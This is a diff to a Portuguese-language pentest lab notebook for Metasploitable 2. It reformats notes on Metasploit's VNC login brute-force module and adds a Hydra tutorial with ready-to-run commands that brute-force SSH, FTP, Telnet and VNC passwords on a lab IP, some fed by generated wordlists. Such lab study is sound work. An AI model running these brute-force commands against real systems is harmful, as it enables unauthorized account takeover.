@@ -1161,29 +1161,24 @@ Bem tranquilinho... :D
 
 ## 4. Ataque – VNC Login 
 
-VISÃO GERAL
+### VISÃO GERAL
 - Nome do módulo: auxiliary/scanner/vnc/vnc_login
 - Tipo: scanner de força bruta
 - Objetivo: Tentar logins VNC usando listas de senhas comun
 - Impacto: Acesso remoto à interface gráfica da máquina alvo
 
-COMO FUNCIONA
+### COMO FUNCIONA
 
-    O módulo tenta se conectar a um servidor VNC em uma ou mais portas (geralmente 5900).
+- O módulo tenta se conectar a um servidor VNC em uma ou mais portas (geralmente 5900).
+- Tenta senhas de uma wordlist (ou senha definida por você).
+- Se a senha estiver correta, o VNC retorna um hash de desafio válido, e o Metasploit reporta a senha como encontrada.
+- Você pode, então, usar um cliente VNC (como vncviewer) para tomar o controle da tela do alvo.
 
-    Tenta senhas de uma wordlist (ou senha definida por você).
+### CENÁRIOS COMUNS DE USO
 
-    Se a senha estiver correta, o VNC retorna um hash de desafio válido, e o Metasploit reporta a senha como encontrada.
-
-    Você pode, então, usar um cliente VNC (como vncviewer) para tomar o controle da tela do alvo.
-
-CENÁRIOS COMUNS DE USO
-
-    Em ambientes com VNC exposto à internet ou LAN
-
-    Em VMs mal configuradas (Metasploitable 2 tem o VNC vulnerável por padrão)
-
-    Em testes internos onde a equipe esqueceu de mudar as senhas padrão
+- Em ambientes com VNC exposto à internet ou LAN
+- Em VMs mal configuradas (Metasploitable 2 tem o VNC vulnerável por padrão)
+- Em testes internos onde a equipe esqueceu de mudar as senhas padrão
 
 ```
 msf6 > 
@@ -1246,7 +1241,77 @@ Aproveitando o embalo do brute force do vnc...
 
 ### Ataques com Hydra: Telnet e VNC (Pentest em Metasploitable 2)
 
-Este documento descreve como utilizar o **Hydra** para realizar ataques de força bruta contra serviços **Telnet** e **VNC** em um ambiente de laboratório, como o Metasploitable 2.
+
+Hydra é uma ferramenta de força bruta rápida e flexível usada para quebrar senhas de serviços de rede, como SSH, FTP, Telnet, HTTP, VNC, entre outros. Ela tenta combinações de usuários e senhas automaticamente até encontrar credenciais válidas. Ideal para testes de intrusão em ambientes autorizados.
+
+Exemplos: 
+
+1. Lista de Usuários e senhas 
+```
+hydra -L users.txt -P passwords.txt 192.168.100.20 ssh
+```
+- Tenta todas as combinações entre os usuários em users.txt e senhas em passwords.txt.
+
+2. Usuário fixo, senhas de wordlist
+```
+hydra -l admin -P rockyou.txt 192.168.100.20 ftp
+```
+- Tenta o usuário "admin" com todas as senhas do arquivo rockyou.txt.
+
+3. Lista de Usuários, senha fixa
+```
+hydra -L users.txt -p 123456 192.168.100.20 telnet
+```
+- Usa todos os usuários da lista com a senha "123456".
+
+4. Usuário e senha iguais (modo par linha a linha)
+```
+hydra -C combos.txt 192.168.100.20 ssh
+```
+- O arquivo combos.txt deve ter pares do tipo: usuario:senha
+  Exemplo:
+    admin:admin
+    user1:123456
+    guest:guest
+
+5. Ataque contra VNC (sem usuário, só senha)
+```
+hydra -P senhas.txt 192.168.100.20 vnc
+```
+- O VNC padrão exige apenas senha (sem login), ideal para testes diretos.
+
+6. Gerar senhas com pwgen e usar no Hydra (stdin)
+Comando:
+```
+pwgen -1 8 100 | hydra -l admin -P - 192.168.100.20 ssh
+```
+Descrição:
+- Gera 100 senhas aleatórias com 8 caracteres
+- Envia direto para o Hydra com a opção -P -
+
+7. Gerar senhas com crunch (combinatório)
+Comando:
+```
+crunch 6 6 abc123 | hydra -l admin -P - 192.168.100.20 ftp
+```
+Descrição:
+- Gera senhas de 6 caracteres usando apenas os caracteres a, b, c, 1, 2, 3
+- Usa diretamente no Hydra
+
+Dica:
+Instalar o crunch, se necessário:
+sudo apt install crunch
+
+8. Gerar senhas aleatórias com Bash e urandom
+Comando:
+```
+for i in {1..100}; do echo $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c8); done | hydra -l admin -P - 192.168.100.20 ssh
+```
+
+Descrição:
+- Gera 100 senhas randômicas com 8 caracteres alfanuméricos
+- Envia direto ao Hydra sem criar arquivo
+
 
 ---
 
